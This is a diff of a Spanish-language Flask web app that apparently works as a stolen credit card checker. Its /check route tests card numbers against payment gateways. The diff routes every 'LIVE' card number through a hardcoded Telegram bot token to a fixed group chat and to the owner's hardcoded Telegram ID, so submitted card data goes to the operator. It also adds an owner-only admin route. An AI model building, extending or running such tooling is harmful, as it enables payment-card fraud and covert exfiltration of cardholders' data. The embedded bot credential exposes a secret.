@@ -1,7 +1,5 @@
 import os
 import asyncio
-import random
-import string
 from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
 from flask_cors import CORS
 from flask_sqlalchemy import SQLAlchemy
@@ -15,7 +13,6 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-
 db = SQLAlchemy(app)
 
 class User(db.Model):
@@ -26,7 +23,6 @@ class User(db.Model):
 
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
-
     def check_password(self, password):
         return check_password_hash(self.password_hash, password)
 
@@ -37,8 +33,8 @@ class Key(db.Model):
 
 class TelegramUser(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    telegram_id = db.Column(db.String(50), unique=True, nullable=False)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    telegram_id = db.Column(db.String(20), nullable=False)
     is_admin = db.Column(db.Boolean, default=False)
 
 @app.before_request
@@ -105,61 +101,76 @@ def logout():
     session.clear()
     return redirect(url_for('index'))
 
+TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
+TELEGRAM_CHAT_ID = '-1002762787906'
+
 @app.route('/save_telegram_id', methods=['POST'])
 def save_telegram_id():
     if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
+        return jsonify({'success': False, 'error': 'No autorizado'}), 401
 
     data = request.get_json()
     telegram_id = data.get('telegram_id')
     if not telegram_id:
-        return jsonify({'error': 'ID de Telegram requerido'}), 400
+        return jsonify({'success': False, 'error': 'Falta telegram_id'})
 
-    existing = TelegramUser.query.filter_by(user_id=session['user_id']).first()
-    if existing:
-        existing.telegram_id = telegram_id
+    user_telegram = TelegramUser.query.filter_by(user_id=session['user_id']).first()
+    if user_telegram:
+        user_telegram.telegram_id = telegram_id
     else:
-        new_entry = TelegramUser(telegram_id=telegram_id, user_id=session['user_id'], is_admin=False)
-        db.session.add(new_entry)
+        db.session.add(TelegramUser(user_id=session['user_id'], telegram_id=telegram_id))
 
     db.session.commit()
-    return jsonify({'success': True, 'message': 'Telegram ID guardado.'})
+    return jsonify({'success': True, 'message': 'Telegram ID guardado'})
 
-@app.route('/is_admin', methods=['GET'])
+@app.route('/add_admin', methods=['POST'])
+def add_admin():
+    if 'user_id' not in session:
+        return jsonify({'success': False, 'error': 'No autorizado'}), 401
+
+    owner_telegram_id = '846983753'
+    owner = TelegramUser.query.filter_by(user_id=session['user_id'], telegram_id=owner_telegram_id).first()
+    if not owner:
+        return jsonify({'success': False, 'error': 'Solo el dueño puede agregar admins'}), 403
+
+    data = request.get_json()
+    new_admin_id = data.get('telegram_id')
+
+    if not new_admin_id:
+        return jsonify({'success': False, 'error': 'Falta telegram_id'})
+
+    existing = TelegramUser.query.filter_by(telegram_id=new_admin_id).first()
+    if existing:
+        existing.is_admin = True
+    else:
+        db.session.add(TelegramUser(user_id=session['user_id'], telegram_id=new_admin_id, is_admin=True))
+
+    db.session.commit()
+    return jsonify({'success': True, 'message': f'ID {new_admin_id} ahora es admin.'})
+
+@app.route('/is_admin')
 def is_admin():
     if 'user_id' not in session:
         return jsonify({'is_admin': False})
 
-    user = TelegramUser.query.filter_by(user_id=session['user_id']).first()
-    if user and user.is_admin:
-        return jsonify({'is_admin': True})
+    user_telegram = TelegramUser.query.filter_by(user_id=session['user_id']).first()
+    if user_telegram and user_telegram.is_admin:
+        return jsonify({'is_admin': True, 'telegram_id': user_telegram.telegram_id})
+
     return jsonify({'is_admin': False})
 
-@app.route('/generate_key', methods=['POST'])
-def generate_key():
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
+def enviar_telegram(mensaje, extra_ids=None):
+    ids_to_notify = [TELEGRAM_CHAT_ID, '846983753']
+    if extra_ids:
+        ids_to_notify += extra_ids
 
-    user = TelegramUser.query.filter_by(user_id=session['user_id']).first()
-    if not user or not user.is_admin:
-        return jsonify({'error': 'No autorizado'}), 403
-
-    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    key_entry = Key(key=new_key)
-    db.session.add(key_entry)
-    db.session.commit()
-    return jsonify({'success': True, 'key': new_key})
-
-TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
-TELEGRAM_CHAT_ID = '-1002762787906'
-
-def enviar_telegram(mensaje):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': mensaje, 'parse_mode': 'Markdown'}
-    try:
-        req.post(url, data=data)
-    except Exception as e:
-        print(f"Error enviando Telegram: {e}")
+    for chat_id in set(ids_to_notify):
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {'chat_id': chat_id, 'text': mensaje, 'parse_mode': 'Markdown'}
+        try:
+            req.post(url, data=data)
+        except Exception as e:
+            print(f"Error enviando Telegram a {chat_id}: {e}")
 
 @app.route('/check', methods=['POST'])
 def check_card():
@@ -181,8 +192,10 @@ def check_card():
             result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
         if result['status'] == 'live':
-            mensaje_telegram = f"\u2705 *LIVE* - {result['cc']}\n{result['message']}"
-            enviar_telegram(mensaje_telegram)
+            mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
+            user_telegram = TelegramUser.query.filter_by(user_id=session['user_id']).first()
+            extra_ids = [user_telegram.telegram_id] if user_telegram and user_telegram.telegram_id else []
+            enviar_telegram(mensaje_telegram, extra_ids=extra_ids)
 
         return jsonify(result)
     except Exception as e:
